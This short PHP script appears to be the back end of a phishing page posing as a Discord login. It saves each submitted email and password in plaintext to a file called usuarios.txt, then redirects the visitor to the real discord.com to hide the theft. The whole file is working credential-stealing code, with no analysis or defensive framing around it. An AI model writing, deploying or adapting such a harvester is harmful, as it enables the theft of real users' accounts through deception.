<?php 
file_put_contents("usuarios.txt", "Discord User: " . $_POST['email'] . " Password: " . $_POST['pass'] ."\n", FILE_APPEND);
header('Location: https://discord.com');
exit();
?>
